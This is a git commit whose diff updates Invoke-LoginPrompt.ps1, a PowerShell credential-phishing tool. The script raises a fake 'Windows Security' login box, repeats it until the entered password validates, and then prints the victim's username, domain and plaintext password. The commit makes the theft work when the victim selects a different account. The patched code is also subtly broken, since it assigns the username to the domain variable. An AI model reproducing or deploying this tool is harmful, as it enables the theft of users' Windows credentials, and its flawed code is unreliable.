e1c9a0838034e3bf57c0b9e2ff457b10a7e65909
johnwait <jonathan.brochu@gmail.com>
2020-02-22 20:14:48 -0500

    Fix for use of alternate usernames/account credentials
    User might select/enter another user account, while we still check the typed password against the initial username.
    
    This fixes (1) bug preventing authentication using (possibly higher) credentials, and (2) false positive when user enters the correct password for the initial username but with a different one selected through the dialog.

--- Invoke-LoginPrompt.ps1
+++ Invoke-LoginPrompt.ps1
@@ -14,18 +14,22 @@ This script will pop a Windows Authentication box and ask the user for credentia
 http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/
 #>
 
-Function Invoke-LoginPrompt{
+Function Invoke-LoginPrompt {
     Add-Type -assemblyname System.DirectoryServices.AccountManagement
     $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
     $InitialPrompt = "Please enter user credentials"
     $RetryPrompt = "Invalid credentials. Please try again"
     Do {
-        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
-        $username = "$env:username"
-        $domain = "$env:userdomain"
-        $full = "$domain" + "\" + "$username"
         $password = ""
-        If ($cred) { $password = $cred.GetNetworkCredential().password }
+        $cred = $Host.ui.PromptForCredential("Windows Security", $(If ($cred) {$RetryPrompt} Else {$InitialPrompt}), "$env:userdomain\$env:username","")
+        If ($cred) {
+            $netcred = $cred.GetNetworkCredential()
+            # User/domain selection might have changed, update
+            $username = $netcred.UserName
+            $domain = $netcred.UserName
+            $full = "$domain" + "\" + "$username"
+            $password = $netcred.password
+        }
     } While($DS.ValidateCredentials("$full", "$password") -ne $True)
     $cred.GetNetworkCredential() | Select-Object UserName, Domain, Password
 }
